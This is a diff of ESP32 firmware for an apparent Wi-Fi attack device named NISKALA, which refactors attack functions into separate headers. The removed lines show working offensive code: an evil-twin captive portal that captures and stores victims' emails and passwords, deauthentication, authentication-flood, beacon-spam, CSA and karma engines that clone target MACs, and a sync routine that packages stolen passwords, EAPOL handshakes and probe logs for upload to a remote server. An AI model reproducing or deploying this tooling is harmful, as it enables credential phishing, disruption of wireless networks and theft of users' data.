@@ -6,6 +6,7 @@
 #include <DNSServer.h>
 #include <WebServer.h>
 #include <Preferences.h>
+#include <LittleFS.h>
 #include <ArduinoOTA.h>
 #include <HTTPClient.h>
 #include <BLEScan.h>
@@ -63,12 +64,16 @@ State currentState = MAIN_MENU;
 #include "eapol.h"
 #include "smart_attack.h"
 #include "allowlist.h"
+#include "config_store.h"
+#include "web_handlers.h"
+#include "attack_control.h"
+#include "board_hal.h"
 #include "ui_screens.h"
 #include "telemetry.h"
 
 int menuSelection = 0;
 int menuScrollPos = 0;
-extern const int MENU_COUNT = 20;
+extern const int MENU_COUNT = 21;
 const char* menuItems[] = {
   "DEAUTH MANUAL",
   "EVIL TWIN",
@@ -89,7 +94,8 @@ const char* menuItems[] = {
   "NETWORK RECON",
   "AP WIFI",
   "EAPOL CAPTURE",
-  "SMART ATTACK"
+  "SMART ATTACK",
+  "PACKET MONITOR"
 };
 
 volatile AttackMode g_attackMode = ATK_IDLE;
@@ -232,7 +238,6 @@ int apWifiSelection = 0;
 int apWifiScrollPos = 0;
 bool confirmApWifiDelete = false;
 unsigned long lastApWifiDeletePress = 0;
-const int MAX_SAVED_PWDS = 50;
 
 DNSServer dnsServer;
 WebServer server(80);
@@ -252,532 +257,13 @@ unsigned long releaseAfterSuccess = 0;
 TaskHandle_t attackTaskHandle = NULL;
 
 // ═══════════════════════════════════════════════
-// HTML halaman status portal
-// ═══════════════════════════════════════════════
-const char HTML_VERIFYING[] PROGMEM = R"raw(
-<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<meta http-equiv="refresh" content="10;url=/">
-<title>Memverifikasi</title>
-<style>
-body{font-family:-apple-system,Arial,sans-serif;background:linear-gradient(135deg,#0f2027,#2c5364);
-min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:16px}
-.card{background:#fff;border-radius:16px;padding:40px 30px;max-width:340px;width:100%;
-text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.4);box-sizing:border-box}
-.spin{border:4px solid #eef2f5;border-top:4px solid #1e88e5;border-radius:50%;
-width:52px;height:52px;animation:sp .9s linear infinite;margin:0 auto 20px}
-@keyframes sp{to{transform:rotate(360deg)}}
-h2{margin:0 0 8px;color:#1e88e5;font-size:20px}p{margin:0;color:#6b7280;font-size:14px}
-</style></head><body><div class="card"><div class="spin"></div><h2>Memverifikasi...</h2>
-<p>Mohon tunggu sebentar</p></div></body></html>
-)raw";
-
-const char HTML_SUCCESS[] PROGMEM = R"raw(
-<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Terhubung</title>
-<style>
-body{font-family:-apple-system,Arial,sans-serif;background:linear-gradient(135deg,#0f2027,#2c5364);
-min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:16px}
-.card{background:#fff;border-radius:16px;padding:40px 30px;max-width:340px;width:100%;
-text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.4);box-sizing:border-box}
-.ok{width:64px;height:64px;border-radius:50%;background:#22c55e;color:#fff;font-size:36px;
-display:flex;align-items:center;justify-content:center;margin:0 auto 20px;line-height:1}
-h2{margin:0 0 8px;color:#22c55e;font-size:22px}p{margin:0;color:#6b7280;font-size:14px}
-</style></head><body><div class="card"><div class="ok">&#10003;</div>
-<h2>Terhubung!</h2><p>Anda sekarang online</p></div></body></html>
-)raw";
-
-const char HTML_ERROR[] PROGMEM = R"raw(
-<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Password Salah</title>
-<style>
-body{font-family:-apple-system,Arial,sans-serif;background:linear-gradient(135deg,#0f2027,#2c5364);
-min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:16px}
-.card{background:#fff;border-radius:16px;padding:40px 30px;max-width:340px;width:100%;
-text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.4);box-sizing:border-box}
-.err{width:64px;height:64px;border-radius:50%;background:#ef4444;color:#fff;font-size:36px;
-display:flex;align-items:center;justify-content:center;margin:0 auto 20px;line-height:1}
-h2{margin:0 0 8px;color:#ef4444;font-size:22px}p{margin:0 0 22px;color:#6b7280;font-size:14px}
-a{display:inline-block;padding:14px 32px;background:#1e88e5;color:#fff;text-decoration:none;
-border-radius:10px;font-weight:600;font-size:15px}
-</style></head><body><div class="card"><div class="err">&#10005;</div>
-<h2>Password Salah</h2><p>Silakan coba lagi</p><a href="/">Coba Lagi</a></div></body></html>
-)raw";
-
-// ═══════════════════════════════════════════════
-// UI helpers
-// ═══════════════════════════════════════════════
-void savePasswordToNVS(String email, String pass) {
-  int count = prefs.getInt("pwd_count", 0);
-  if (count < MAX_SAVED_PWDS) {
-    prefs.putString(("pwd_" + String(count)).c_str(), email + "|" + pass);
-    prefs.putULong(("pwd_ts_" + String(count)).c_str(), millis());
-    prefs.putInt("pwd_count", count + 1);
-  }
-}
-
-void deletePasswordEntry(int idx) {
-  int total = prefs.getInt("pwd_count", 0);
-  if (idx < 0 || idx >= total) return;
-  for (int i = idx; i < total - 1; i++) {
-    prefs.putString(("pwd_" + String(i)).c_str(), prefs.getString(("pwd_" + String(i + 1)).c_str(), ""));
-    prefs.putULong(("pwd_ts_" + String(i)).c_str(), prefs.getULong(("pwd_ts_" + String(i + 1)).c_str(), 0));
-  }
-  prefs.remove(("pwd_" + String(total - 1)).c_str());
-  prefs.remove(("pwd_ts_" + String(total - 1)).c_str());
-  prefs.putInt("pwd_count", total - 1);
-}
-void updatePasswordVerification(bool ok) {
-  int count = prefs.getInt("pwd_count", 0);
-  if (count <= 0) return;
-  String key = "pwd_" + String(count - 1);
-  String entry = prefs.getString(key.c_str(), "");
-  int p1 = entry.indexOf('|');
-  if (p1 < 0) return;
-  String email = entry.substring(0, p1);
-  String rest = entry.substring(p1 + 1);
-  int p2 = rest.indexOf('|');
-  String pass = (p2 > 0) ? rest.substring(0, p2) : rest;
-  prefs.putString(key.c_str(), email + "|" + pass + "|" + (ok ? "1" : "0"));
-}
+// ------------------------------------------------------------------
+// Password vault: reset level UI tetap di sini, logika NVS di config_store.
+// ------------------------------------------------------------------
 void deleteAllPasswordsFromNVS() {
   prefs.clear();
   viewSelection = 0; viewScrollPos = 0;
 }
-
-void saveConfig() {
-  prefs.putInt("cfg_deauth", cfg_deauth_burst);
-  prefs.putInt("cfg_auth", cfg_auth_burst);
-  prefs.putInt("cfg_hop", cfg_hop_interval_ms);
-  prefs.putInt("cfg_beacon", cfg_beacon_hop_ms);
-  prefs.putInt("cfg_reason", cfg_deauth_reason);
-  prefs.putString("wifi_ssid", cfg_wifi_ssid);
-  prefs.putString("wifi_pass", cfg_wifi_pass);
-  prefs.putString("srv_url", cfg_server_url);
-  prefs.putString("tpl_url", cfg_template_url);
-  prefs.putInt("autosync", cfg_autosync_min);
-}
-
-// ═══════════════════════════════════════════════
-// Web handlers
-// ═══════════════════════════════════════════════
-void handleRoot() {
-  if (isWebRemoteRunning) {
-    server.send_P(200, "text/html", HTML_REMOTE);
-    return;
-  }
-  if (verifyState == 2) {
-    server.send_P(200, "text/html", HTML_SUCCESS);
-    return;
-  }
-  if (verifyState == 3) {
-    verifyState = 0;
-    server.send_P(200, "text/html", HTML_ERROR);
-    return;
-  }
-  if (isReleasing || isVerifying || verifyState == 1) {
-    server.send_P(200, "text/html", HTML_VERIFYING);
-    return;
-  }
-  if (useCustomTemplate && g_customTemplate.length() > 0) {
-    server.send(200, "text/html", g_customTemplate);
-    return;
-  }
-  server.send(200, "text/html", renderTemplateForHost(server.hostHeader(), selectedTemplateIdx));
-}
-
-void handleLogin() {
-  if (server.hasArg("password")) {
-    capturedPass = server.arg("password");
-    if (server.hasArg("email") && server.arg("email").length() > 0) {
-      capturedEmail = server.arg("email");
-    } else {
-      capturedEmail = "WiFi-Pass";
-    }
-    Serial.printf("[LOGIN] %s / %s\n", capturedEmail.c_str(), capturedPass.c_str());
-    savePasswordToNVS(capturedEmail, capturedPass);
-    isReleasing = true;
-    releaseTimer = millis();
-    verifyState = 1;
-    server.send_P(200, "text/html", HTML_VERIFYING);
-  } else {
-    server.send(400, "text/plain", "Bad Request");
-  }
-}
-
-void handleNotFound() {
-  if (isWebRemoteRunning) {
-    server.sendHeader("Location", "http://192.168.4.1/rc", true);
-    server.send(302, "text/plain", "");
-    return;
-  }
-  if (useCustomTemplate && g_customTemplate.length() > 0) {
-    server.send(200, "text/html", g_customTemplate);
-    return;
-  }
-  server.send(200, "text/html", renderTemplateForHost(server.hostHeader(), selectedTemplateIdx));
-}
-
-// ═══════════════════════════════════════════════
-// Engine control
-// ═══════════════════════════════════════════════
-void applyPromiscuousFilter(bool probeOnly) {
-  wifi_promiscuous_filter_t filter;
-  filter.filter_mask = probeOnly
-    ? WIFI_PROMIS_FILTER_MASK_MGMT
-    : (WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA);
-  esp_wifi_set_promiscuous_filter(&filter);
-}
-
-// ── Karma ──
-void startKarmaScan() {
-  memset(g_karmaSSIDs, 0, sizeof(g_karmaSSIDs));
-  memset(g_karmaClients, 0, sizeof(g_karmaClients));
-  g_karmaSSIDCount = 0;
-  g_karmaClientCount = 0;
-  g_karmaResponses = 0;
-  g_karmaActiveMode = true;
-
-  radioSetMode(RADIO_AP_STA);
-  delay(200);
-  if (!isWebRemoteRunning) {
-    restoreOriginalApMac();
-    WiFi.softAP("Karma_Scan", NULL, 1, 1, 8);
-    delay(300);
-  }
-
-  applyPromiscuousFilter(false);
-  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
-  esp_wifi_set_promiscuous(true);
-
-  setAttackMode(ATK_KARMA);
-  isKarmaRunning = true;
-  karmaScanStart = millis();
-  Serial.println("[KARMA] Scan started (20s, active mode)");
-}
-
-void stopKarmaScan() {
-  isKarmaRunning = false;
-  setAttackMode(ATK_IDLE);
-  resetWifiStateAfterAttack();
-  Serial.println("[KARMA] Scan stopped");
-}
-
-// ── Deauth ──
-void startDeauthEngine() {
-  if (isWebRemoteRunning) {
-    if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
-  } else {
-    radioSetMode(RADIO_STA);
-    delay(50);
-    uint8_t mac[6]; esp_wifi_get_mac(WIFI_IF_AP, mac);
-    if (memcmp(mac, g_targetBSSID, 6) != 0) {
-      esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
-      if (macErr != ESP_OK) {
-        Serial.printf("[WARN] set_mac failed (%d), pakai MAC existing\n", macErr);
-      }
-      delay(50);
-    }
-    radioSetMode(RADIO_AP_STA);
-    WiFi.softAP("Deauther_Fix", "12345678", 1, 1); delay(400);
-  }
-  applyPromiscuousFilter(false);
-  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
-  esp_wifi_set_promiscuous(true);
-  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
-  delay(100);
-  resetPacketCounters();
-  setVictimFound(false);
-  isDeauthRunning = true;
-  setAttackMode(ATK_DEAUTH_TARGET);
-}
-
-void stopDeauthEngine() {
-  isDeauthRunning = false;
-  setAttackMode(ATK_IDLE);
-  resetWifiStateAfterAttack();
-}
-
-void startAuthFlood() {
-  if (isWebRemoteRunning) {
-    if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
-  } else {
-    if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
-    uint8_t mac[6]; esp_wifi_get_mac(WIFI_IF_AP, mac);
-    if (memcmp(mac, g_targetBSSID, 6) != 0) {
-      esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
-      if (macErr != ESP_OK) {
-        Serial.printf("[WARN] set_mac failed (%d)\n", macErr);
-      }
-      delay(50);
-    }
-    WiFi.softAP("AuthFlood", "12345678", 1, 1); delay(300);
-  }
-  esp_wifi_set_promiscuous(false);
-  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
-  delay(100);
-  resetPacketCounters();
-  isAuthFloodRunning = true;
-  setAttackMode(ATK_AUTH_FLOOD);
-  Serial.printf("[AUTH] Flood ke BSSID=%02X:%02X:%02X:%02X:%02X:%02X ch=%d burst=%d\n",
-                g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
-                g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5],
-                g_targetChannel, cfg_auth_burst);
-}
-
-void stopAuthFlood() {
-  isAuthFloodRunning = false;
-  setAttackMode(ATK_IDLE);
-  resetWifiStateAfterAttack();
-  Serial.println("[AUTH] Flood dihentikan");
-}
-
-void startGlobalDeauth() {
-  if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
-  if (!isWebRemoteRunning) {
-    restoreOriginalApMac();
-    WiFi.softAP("Global_Deauth", "12345678", 1, 1); delay(300);
-  }
-  esp_wifi_set_promiscuous(false);
-  resetPacketCounters();
-  isGlobalDeauthRunning = true;
-  setAttackMode(ATK_DEAUTH_GLOBAL);
-  Serial.println("[GLOBAL] Deauth semua kanal dimulai");
-}
-
-void stopGlobalDeauth() {
-  isGlobalDeauthRunning = false;
-  setAttackMode(ATK_IDLE);
-  resetWifiStateAfterAttack();
-  Serial.println("[GLOBAL] Deauth dihentikan");
-}
-
-void startBeaconSpam() {
-  if (!isWebRemoteRunning) {
-    radioSetMode(RADIO_AP);
-    restoreOriginalApMac();
-    WiFi.softAP("Beacon_Init", "12345678", 1, 1); delay(300);
-  } else {
-    radioSetMode(RADIO_AP_STA);
-  }
-  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
-  esp_wifi_set_promiscuous(false);
-  resetPacketCounters();
-  isBeaconRunning = true;
-  setAttackMode(ATK_BEACON);
-}
-
-void stopBeaconSpam() {
-  isBeaconRunning = false;
-  setAttackMode(ATK_IDLE);
-  resetWifiStateAfterAttack();
-}
-
-void startProbeSniffer() {
-  if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
-  if (!isWebRemoteRunning) {
-    restoreOriginalApMac();
-    WiFi.softAP("Probe_Sniff", "12345678", 1, 1); delay(200);
-  }
-  portENTER_CRITICAL(&g_probeLogMux);
-  g_probeLogHead = 0; g_probeLogCount = 0;
-  portEXIT_CRITICAL(&g_probeLogMux);
-  applyPromiscuousFilter(true);
-  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
-  esp_wifi_set_promiscuous(true);
-  isProbeRunning = true;
-  setAttackMode(ATK_PROBE);
-}
-
-void stopProbeSniffer() {
-  isProbeRunning = false;
-  setAttackMode(ATK_IDLE);
-  resetWifiStateAfterAttack();
-}
-
-void startBTSpam() {
-  radioSetMode(RADIO_OFF);
-  if (btSpamInit()) {
-    isBTSpamRunning = true;
-    setAttackMode(ATK_IDLE);
-  }
-}
-
-void stopBTSpam() {
-  btSpamStop();
-  isBTSpamRunning = false;
-  resetWifiStateAfterAttack();
-}
-
-// ── CSA  [PATCH 2] ──
-void startCSAAttack() {
-  if (isWebRemoteRunning) {
-    if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
-  } else {
-    if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
-    uint8_t mac[6]; esp_wifi_get_mac(WIFI_IF_AP, mac);
-    if (memcmp(mac, g_targetBSSID, 6) != 0) {
-      esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
-      if (macErr != ESP_OK) {
-        Serial.printf("[WARN] CSA set_mac failed (%d)\n", macErr);
-      }
-      delay(50);
-    }
-    WiFi.softAP("CSA_Init", "12345678", 1, 1); delay(300);
-  }
-  applyPromiscuousFilter(false);
-  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
-  esp_wifi_set_promiscuous(true);
-  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
-  delay(100);
-
-  strncpy(g_csaTargetSSID, targetSSID.c_str(), 32);
-  g_csaTargetSSID[32] = 0;
-
-  resetPacketCounters();
-  setVictimFound(false);
-  isCSARunning = true;
-  setAttackMode(ATK_CSA);
-  Serial.printf("[CSA] Started on BSSID %02X:%02X:%02X:%02X:%02X:%02X ch=%d SSID=%s\n",
-                g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
-                g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5],
-                g_targetChannel, g_csaTargetSSID);
-}
-
-void stopCSAAttack() {
-  isCSARunning = false;
-  setAttackMode(ATK_IDLE);
-  resetWifiStateAfterAttack();
-  Serial.println("[CSA] Stopped");
-}
-
-// ── Web Remote ──
-void startWebRemote() {
-  radioSetMode(RADIO_AP_STA);
-  delay(200);
-  restoreOriginalApMac();
-  WiFi.softAP("NISKALA_CTRL", "niskala123", 1, 0, 4);
-  delay(300);
-  server.begin();
-  dnsServer.start(53, "*", WiFi.softAPIP());
-  isWebRemoteRunning = true;
-  Serial.println("[WEB] Remote control aktif");
-  drawWebRemoteScreen();
-}
-
-void stopWebRemote() {
-  server.stop();
-  dnsServer.stop();
-  resetWifiStateAfterAttack();
-  isWebRemoteRunning = false;
-  Serial.println("[WEB] Remote control berhenti");
-}
-
-// Cloud Sync (kirim hasil ke hosting)
-// ------------------------------------------------------------------
-String buildSyncJson() {
-  String mac = WiFi.macAddress();
-  String j = "{\"device\":\"NISKALA\",\"mac\":\"" + mac + "\",\"uptime\":" + String(millis() / 1000) + ",";
-
-  // probe log
-  j += "\"probe\":[";
-  portENTER_CRITICAL(&g_probeLogMux);
-  int cnt = g_probeLogCount;
-  int head = g_probeLogHead;
-  ProbeEntry snap[PROBE_LOG_SIZE];
-  for (int i = 0; i < cnt; i++) {
-    int idx = (head - cnt + i + PROBE_LOG_SIZE) % PROBE_LOG_SIZE;
-    snap[i] = g_probeLog[idx];
-  }
-  portEXIT_CRITICAL(&g_probeLogMux);
-  for (int i = 0; i < cnt; i++) {
-    if (i) j += ",";
-    char m[18];
-    snprintf(m, sizeof(m), "%02X:%02X:%02X:%02X:%02X:%02X",
-             snap[i].mac[0], snap[i].mac[1], snap[i].mac[2],
-             snap[i].mac[3], snap[i].mac[4], snap[i].mac[5]);
-    String ssid = snap[i].ssid[0] ? String(snap[i].ssid) : String("(hidden)");
-    j += "{\"mac\":\"" + String(m) + "\",\"rssi\":" + String(snap[i].rssi) + ",\"ssid\":\"" + jsonEscape(ssid) + "\"}";
-  }
-  j += "],";
-
-  // karma
-  j += "\"karma\":[";
-  for (int i = 0; i < g_karmaSSIDCount; i++) {
-    if (i) j += ",";
-    j += "{\"ssid\":\"" + jsonEscape(String(g_karmaSSIDs[i].ssid)) + "\",\"probe_count\":" + String(g_karmaSSIDs[i].probeCount) + ",\"auth_count\":" + String(g_karmaSSIDs[i].authCount) + "}";
-  }
-  j += "],";
-
-  // passwords
-  int total = prefs.getInt("pwd_count", 0);
-  j += "\"passwords\":[";
-  for (int i = 0; i < total; i++) {
-    String entry = prefs.getString(("pwd_" + String(i)).c_str(), "");
-    int p1 = entry.indexOf('|');
-    String email = (p1 > 0) ? entry.substring(0, p1) : entry;
-    String rest = (p1 > 0) ? entry.substring(p1 + 1) : "";
-    int p2 = rest.indexOf('|');
-    String pass = (p2 > 0) ? rest.substring(0, p2) : rest;
-    String ver = (p2 > 0) ? rest.substring(p2 + 1) : "";
-    if (i) j += ",";
-    j += "{\"email\":\"" + jsonEscape(email) + "\",\"password\":\"" + jsonEscape(pass) + "\",\"verified\":\"" + ver + "\"}";
-  }
-  j += "],\"eapol\":" + buildEapolJson() + ",\"ble\":[\n";
-  for (int i = 0; i < g_bleScanCount; i++) {
-    if (i) j += ",";
-    j += "{\"mac\":\"" + String(g_bleScanLog[i].mac) + "\",\"name\":\"" + jsonEscape(String(g_bleScanLog[i].name)) + "\",\"rssi\":" + String(g_bleScanLog[i].rssi) + ",\"seen_count\":" + String(g_bleScanLog[i].seenCount) + "}";
-  }
-  j += "]}";
-  return j;
-}
-
-void stopAttacksKeepWebRemote() {
-  if (isDeauthRunning) { isDeauthRunning = false; esp_wifi_set_promiscuous(false); }
-  if (isBeaconRunning) isBeaconRunning = false;
-  if (isAuthFloodRunning) isAuthFloodRunning = false;
-  if (isGlobalDeauthRunning) isGlobalDeauthRunning = false;
-  if (isProbeRunning) { isProbeRunning = false; esp_wifi_set_promiscuous(false); }
-  if (isBTSpamRunning) { btSpamStop(); isBTSpamRunning = false; }
-  if (isCSARunning) { isCSARunning = false; esp_wifi_set_promiscuous(false); }
-  if (isKarmaRunning) { isKarmaRunning = false; esp_wifi_set_promiscuous(false); }
-  if (isEvilTwinRunning) {
-    isEvilTwinRunning = false;
-    isReleasing = false;
-    isVerifying = false;
-    verifyState = 0;
-    server.stop();
-    dnsServer.stop();
-    esp_wifi_set_promiscuous(false);
-  }
-  setAttackMode(ATK_IDLE);
-  logEvent("STOP attacks (keep web)");
-}
-
-// Hentikan semua modul serangan tanpa merusak AP kontrol saat idle
-void stopAllAttacks() {
-  if (isDeauthRunning) stopDeauthEngine();
-  if (isBeaconRunning) stopBeaconSpam();
-  if (isAuthFloodRunning) stopAuthFlood();
-  if (isGlobalDeauthRunning) stopGlobalDeauth();
-  if (isProbeRunning) stopProbeSniffer();
-  if (isBTSpamRunning) stopBTSpam();
-  if (isCSARunning) stopCSAAttack();
-  if (isKarmaRunning) stopKarmaScan();
-  if (isEvilTwinRunning) {
-    isEvilTwinRunning = false;
-    isReleasing = false;
-    isVerifying = false;
-    verifyState = 0;
-    verifyAttempts = 0;
-    server.stop();
-    dnsServer.stop();
-    resetWifiStateAfterAttack();
-  }
-  setAttackMode(ATK_IDLE);
-  logEvent("STOP all attacks");
-}
-
-// ── Evil Twin  [PATCH 5 MAC cloning] ──
 void stopEvilTwin();
 
 String getBestDiscoveredSSID() {
@@ -969,13 +455,13 @@ void updateVerification() {
 
 
 void handleAPListNavigation() {
-  if (digitalRead(BTN_TOP) == LOW) {
+  if (btnTopPressed()) {
     delay(200);
     selectedIdx++;
     if (selectedIdx > apCount) selectedIdx = 0;
     drawAPList();
   }
-  if (digitalRead(BTN_BOTTOM) == LOW) {
+  if (btnBottomPressed()) {
     delay(200);
     if (selectedIdx == apCount) {
       currentState = MAIN_MENU; drawMainMenu();
@@ -988,7 +474,7 @@ void handleAPListNavigation() {
         g_reconSelectedAuth = (int)WiFi.encryptionType(selectedIdx);
         currentState = RECON;
         startNetworkRecon();
-        while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
+        while (btnBottomPressed()) delay(50);
         return;
       }
 
@@ -996,27 +482,27 @@ void handleAPListNavigation() {
         currentState = CLIENT_MONITOR_RUNNING;
         startClientMonitor();
         drawClientMonitor();
-        while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
+        while (btnBottomPressed()) delay(50);
         return;
       }
       if (currentState == AP_LIST_CSA) {
         currentState = CSA_RUNNING;
         startCSAAttack();
         drawCSARunning(0);
-        while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
+        while (btnBottomPressed()) delay(50);
         return;
       }
       if (currentState == AP_LIST_EAPOL) {
         currentState = EAPOL_CAPTURE_RUNNING;
         startEapolCapture();
-        while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
+        while (btnBottomPressed()) delay(50);
         return;
       }
 
       if (currentState == AP_LIST_SMART) {
         currentState = SMART_PROFILE;
         drawSmartProfile();
-        while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
+        while (btnBottomPressed()) delay(50);
         return;
       }
 
@@ -1036,11 +522,11 @@ void handleAPListNavigation() {
         while (digitalRead(BTN_TOP) != LOW && digitalRead(BTN_BOTTOM) != LOW) delay(50);
         delay(300);
 
-        if (digitalRead(BTN_BOTTOM) == LOW) {
+        if (btnBottomPressed()) {
           currentState = CSA_RUNNING;
           startCSAAttack();
           drawCSARunning(0);
-          while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
+          while (btnBottomPressed()) delay(50);
         } else {
           currentState = MAIN_MENU;
           drawMainMenu();
@@ -1065,17 +551,17 @@ void handleAPListNavigation() {
 }
 
 void handleTemplateSelect() {
-  if (digitalRead(BTN_TOP) == LOW) {
+  if (btnTopPressed()) {
     delay(200);
     templateSelection = (templateSelection + 1) % TEMPLATE_COUNT;
     drawTemplateSelect();
   }
-  if (digitalRead(BTN_BOTTOM) == LOW) {
+  if (btnBottomPressed()) {
     delay(200);
     if (templateSelection == 5) {
       currentState = FETCH_TEMPLATE;
       startFetchCustomTemplate();
-      while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
+      while (btnBottomPressed()) delay(50);
       return;
     } else {
       selectedTemplateIdx = templateSelection;
@@ -1090,12 +576,12 @@ void handleTemplateSelect() {
 }
 
 void handleEvilTwinModeSelect() {
-  if (digitalRead(BTN_TOP) == LOW) {
+  if (btnTopPressed()) {
     delay(200);
     evilTwinModeSelection = (evilTwinModeSelection + 1) % 2;
     drawEvilTwinModeSelect();
   }
-  if (digitalRead(BTN_BOTTOM) == LOW) {
+  if (btnBottomPressed()) {
     delay(200);
     g_evilTwinCoop = (evilTwinModeSelection == 1);
     currentState = TEMPLATE_SELECT;
@@ -1105,7 +591,7 @@ void handleEvilTwinModeSelect() {
 }
 
 void handleKarmaResults() {
-  if (digitalRead(BTN_TOP) == LOW) {
+  if (btnTopPressed()) {
     delay(200);
     karmaSelection++;
     if (karmaSelection > g_karmaSSIDCount) karmaSelection = 0;
@@ -1113,7 +599,7 @@ void handleKarmaResults() {
     else if (karmaSelection < karmaScrollPos) karmaScrollPos = karmaSelection;
     drawKarmaResults();
   }
-  if (digitalRead(BTN_BOTTOM) == LOW) {
+  if (btnBottomPressed()) {
     delay(200);
 
     if (karmaSelection >= g_karmaSSIDCount) {
@@ -1213,7 +699,7 @@ void apScanTick() {
     g_scanPendingMenu = -1;
     currentState = MAIN_MENU;
     drawMainMenu();
-  } else if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+  } else if (btnTopPressed() || btnBottomPressed()) {
     WiFi.scanDelete();
     apCount = -1;
     g_scanPendingMenu = -1;
@@ -1237,8 +723,8 @@ void showDisclaimerFlow() {
     drawConfirmationScreen(tft);
     bool cancelled = false;
     while (true) {
-      if (digitalRead(BTN_TOP) == LOW) { delay(300); cancelled = true; break; }
-      if (digitalRead(BTN_BOTTOM) == LOW) { delay(300); break; }
+      if (btnTopPressed()) { delay(300); cancelled = true; break; }
+      if (btnBottomPressed()) { delay(300); break; }
       delay(50);
     }
     if (!cancelled) return;
@@ -1287,11 +773,13 @@ void setup() {
   tft.fillScreen(TFT_BLACK);
 
   Serial.println("[1/4] Splash...");
+#if NISKALA_HAS_TFT
   drawElegantSplash();
-
+#endif
   Serial.println("[2/4] Disclaimer...");
+#if NISKALA_HAS_TFT
   showDisclaimerFlow();
-
+#endif
   radioSetMode(RADIO_AP_STA);
   esp_wifi_get_mac(WIFI_IF_AP, g_originalApMac);
   radioSetMode(RADIO_STA);
@@ -1302,9 +790,10 @@ void setup() {
     attackTask, "attack", 4096, NULL, 2, &attackTaskHandle, 0
   );
 
+#if NISKALA_HAS_TFT
   Serial.println("[4/4] Draw main menu...");
   drawMainMenu();
-
+#endif
   Serial.println("Setup selesai, heap tersisa: " + String(ESP.getFreeHeap()));
   Serial.println("Ketik 'help' untuk CLI (Serial Monitor 115200).");
   logEvent("BOOT v" FW_VERSION " heap=%u", (unsigned)ESP.getFreeHeap());
@@ -1320,8 +809,9 @@ static int animFrame = 0;
 void loop() {
   handleSerialCLI();
 
+#if NISKALA_HAS_TFT
   // ---- Screensaver (dim + particle orbit) ----
-  bool anyBtn = (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW);
+  bool anyBtn = (btnTopPressed() || btnBottomPressed());
   if (screensaverActive) {
     if (anyBtn) {
       screensaverActive = false;
@@ -1346,6 +836,7 @@ void loop() {
     return;
   }
   // ---- end screensaver ----
+#endif // NISKALA_HAS_TFT
 
   // Non-blocking transient info (verification result hold)
   if (transientActive) {
@@ -1379,7 +870,7 @@ void loop() {
       return;
     }
 
-    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnTopPressed() || btnBottomPressed()) {
       delay(300);
       stopKarmaScan();
       currentState = MAIN_MENU;
@@ -1396,7 +887,7 @@ void loop() {
 
   // ── EVIL_TWIN: success ──
   if (verifyState == 2 && isEvilTwinRunning) {
-    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnTopPressed() || btnBottomPressed()) {
       delay(300);
       stopEvilTwin();
       verifyState = 0;
@@ -1434,7 +925,7 @@ void loop() {
 
   // ── EVIL_TWIN: verifying ──
   if (isVerifying) {
-    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnTopPressed() || btnBottomPressed()) {
       delay(300);
       stopEvilTwin();
       verifyState = 0;
@@ -1450,7 +941,7 @@ void loop() {
 
   // ── EVIL_TWIN: normal ──
   if (isEvilTwinRunning) {
-    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnTopPressed() || btnBottomPressed()) {
       delay(300);
       stopEvilTwin();
       verifyState = 0;
@@ -1477,6 +968,7 @@ void loop() {
   }
 
   // ── Fitur lain ──
+#if NISKALA_HAS_TFT
   if (currentState == DEAUTH_MENU && isDeauthRunning) {
     if (millis() - lastUI > 200) { drawDeauthMenu(); lastUI = millis(); }
   }
@@ -1496,6 +988,7 @@ void loop() {
     btSpamTick();
     if (millis() - lastUI > 200) { drawBTSpam(animFrame++); lastUI = millis(); }
   }
